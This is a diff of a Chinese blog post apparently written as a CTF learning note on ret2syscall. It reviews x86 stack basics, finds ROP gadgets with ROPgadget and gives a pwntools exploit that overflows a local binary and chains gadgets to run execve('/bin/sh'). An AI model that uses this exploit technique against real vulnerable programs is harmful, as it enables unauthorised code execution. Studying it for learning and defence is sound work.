@@ -81,22 +81,22 @@
 
 
 
-<meta name="description" content="ret2syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识： 1、x86下 ip 调用指令的过程：  1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； 2、ip += 所读指令的长度，从而指向下一条指令； 3、执行指令，然后返回第一步  2、入栈 push 操作的本质：（pop就是反过来）  1、e">
+<meta name="description" content="Ret2Syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识：  x86下 ip 调用指令的过程：   从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； ip += 所读指令的长度，从而指向下一条指令； 执行指令，然后返回第一步   入栈 push 操作的本质：（pop就是反过来）   esp 寄存器中的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2syscall">
-<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;index.html">
+<meta property="og:title" content="Ret2Syscall">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;index.html">
 <meta property="og:site_name" content="白仁的博客">
-<meta property="og:description" content="ret2syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识： 1、x86下 ip 调用指令的过程：  1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； 2、ip += 所读指令的长度，从而指向下一条指令； 3、执行指令，然后返回第一步  2、入栈 push 操作的本质：（pop就是反过来）  1、e">
+<meta property="og:description" content="Ret2Syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识：  x86下 ip 调用指令的过程：   从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； ip += 所读指令的长度，从而指向下一条指令； 执行指令，然后返回第一步   入栈 push 操作的本质：（pop就是反过来）   esp 寄存器中的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;ret2syscall-1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;shell.png">
-<meta property="og:updated_time" content="2019-12-07T04:31:35.024Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;syscall.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;ret2syscall-1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;syscall-2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;syscall-3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;syscall-4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;shell.png">
+<meta property="og:updated_time" content="2020-03-18T06:13:31.420Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;Ret2Syscall&#x2F;syscall.png">
 
 
 
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
+  <link rel="canonical" href="http://bai-ren-1.github.io/2019/12/06/Ret2Syscall/"/>
 
 
 
 
 
-  <title>ret2syscall | 白仁的博客</title>
+  <title>Ret2Syscall | 白仁的博客</title>
   
 
 
@@ -249,7 +249,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2019/12/06/Ret2Syscall/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="白仁">
@@ -266,7 +266,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ret2syscall</h1>
+          <h1 class="post-title" itemprop="name headline">Ret2Syscall</h1>
         
 
         <div class="post-meta">
@@ -338,31 +338,37 @@
       
 
       
-        <h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p>
+        <h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p>
 <p>先附上有点模糊了的知识：</p>
-<p>1、x86下 ip 调用指令的过程：</p>
+<ul>
+<li>x86下 ip 调用指令的过程：</li>
+</ul>
 <blockquote>
-<p>1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p>
-<p>2、ip += 所读指令的长度，从而指向下一条指令；</p>
-<p>3、执行指令，然后返回第一步</p>
+<p>从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p>
+<p>ip += 所读指令的长度，从而指向下一条指令；</p>
+<p>执行指令，然后返回第一步</p>
 </blockquote>
-<p>2、入栈 push 操作的本质：（pop就是反过来）</p>
+<ul>
+<li>入栈 push 操作的本质：（pop就是反过来）</li>
+</ul>
 <blockquote>
-<p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p>
-<p>2、将数据传入这个新的栈顶单元</p>
+<p>esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p>
+<p>将数据传入这个新的栈顶单元</p>
 </blockquote>
-<p>3、call 和 ret 的原理</p>
+<ul>
+<li>call 和 ret 的原理</li>
+</ul>
 <blockquote>
 <p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p>
 <p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p>
 </blockquote>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Ret2Syscall，即控制程序执行系统调用，获取shell。</p>
 <p>贴上wiki上面关于syscall的解释：</p>
 <blockquote>
 <p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p>
 <p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p>
 </blockquote>
-<p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/syscall.png" alt></p>
 <p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p>
 <blockquote>
 <ol>
@@ -596,15 +602,15 @@
 
 <p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p>
 <p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p>
-<p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/ret2syscall-1.png" alt></p>
 <p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p>
 <p>然后我们继续寻找 ebx :</p>
-<p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/syscall-2.png" alt></p>
 <p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p>
 <p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p>
-<p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/syscall-3.png" alt></p>
 <p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p>
-<p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/syscall-4.png" alt></p>
 <p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -615,7 +621,7 @@
 <p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p>
 </blockquote>
 <p>至此 rop 链构建成功，成功getshell。</p>
-<p><img src="/2019/12/06/ret2syscall/shell.png" alt></p>
+<p><img src="/2019/12/06/Ret2Syscall/shell.png" alt></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>
 
       
@@ -641,8 +647,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/02/Java%E5%AE%A1%E8%AE%A1-DAY3/" rel="next" title="Java审计-DAY3">
-                <i class="fa fa-chevron-left"></i> Java审计-DAY3
+              <a href="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含">
+                <i class="fa fa-chevron-left"></i> 文件包含
               </a>
             
           </div>
@@ -730,7 +736,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -741,7 +747,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -783,7 +789,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">1.</span> <span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子"><span class="nav-number">1.2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ret2Syscall"><span class="nav-number">1.</span> <span class="nav-text">Ret2Syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子"><span class="nav-number">1.2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
             
 
           </div>
